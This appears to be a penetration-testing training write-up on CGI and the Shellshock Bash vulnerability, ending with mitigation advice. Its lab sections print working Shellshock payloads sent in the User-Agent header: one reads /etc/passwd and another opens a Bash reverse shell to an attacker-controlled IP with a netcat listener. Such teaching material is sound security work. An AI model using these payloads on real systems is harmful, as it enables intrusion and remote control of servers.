A [Common Gateway Interface (CGI)](https://www.w3.org/CGI/) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources.

CGI scripts/applications are typically used for a few reasons:

- If the webserver must dynamically interact with the user
- When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver

Broadly, the steps are as follows:

- A directory is created on the web server containing the CGI scripts/applications. This directory is typically called `CGI-bin`.
- The web application user sends a request to the server via a URL, i.e, [https://acme.com/cgi-bin/newchiscript.pl](https://acme.com/cgi-bin/newchiscript.pl)
- The server runs the script and passed the resultant output back to the web client

There are some disadvantages to using them: The CGI program starts a new process for each HTTP request which can take up a lot of server memory. A new database connection is opened each time. Data cannot be cached between page loads which reduces efficiency.

## CGI Attacks

Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, "Bash bug") vulnerability via CGI. The Shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables. At the time of discovery, it was a 25-year-old bug and a significant threat to companies worldwide.


## Shellshock via CGI

The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable.

```
		shellsession
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```



When the above variable is assigned, Bash will interpret the `y='() { :;};'` portion as a function definition for a variable `y`. The function does nothing but returns an exit code `0`, but when it is imported, it will execute the command `echo vulnerable-shellshock` if the version of Bash is vulnerable. This (or any other command, such as a reverse shell one-liner) will be run in the context of the web server user. Most of the time, this will be a user such as `www-data`, and we will have access to the system but still need to escalate privileges. Occasionally we will get really lucky and gain access as the `root` user if the web server is running in an elevated context.

This behavior no longer occurs on a patched system, as Bash will not execute code after a function definition is imported. Furthermore, Bash will no longer interpret `y=() {...}` as a function definition. But rather, function definitions within environment variables must now be prefixed with `BASH_FUNC_`.

#### Enumeration - Gobuster

We can hunt for CGI scripts using a tool such as `Gobuster`. Here we find one, `access.cgi`.

        shellsession
`tylapcheong@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi`

Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.

        shellsession
`tylapcheong@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi`

#### Confirming the Vulnerability

To check for the vulnerability, we can use a simple `cURL` command or use Burp Suite Repeater or Intruder to fuzz the user-agent field. Here we can see that the contents of the `/etc/passwd` file are returned to us, thus confirming the vulnerability via the user-agent field.

```
        shellsession
tylapcheong@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
```


#### Exploitation to Reverse Shell Access

Once the vulnerability has been confirmed, we can obtain reverse shell access in many ways. In this example, we use a simple Bash one-liner and get a callback on our Netcat listener.

```
        shellsession
tylapcheong@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

From here, we could begin hunting for sensitive data or attempt to escalate privileges. During a network penetration test, we could try to use this host to pivot further into the internal network.

```
        shellsession
tylapcheong@htb[/htb]$ sudo nc -lvnp 7777
```

## Mitigation

This [blog post](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability) contains useful tips for mitigating the Shellshock vulnerability. The quickest way to remediate the vulnerability is to update the version of Bash on the affected system. This can be trickier on end-of-life Ubuntu/Debian systems, so a sysadmin may have first to upgrade the package manager. With certain systems (i.e., IoT devices that use CGI), upgrading may not be possible.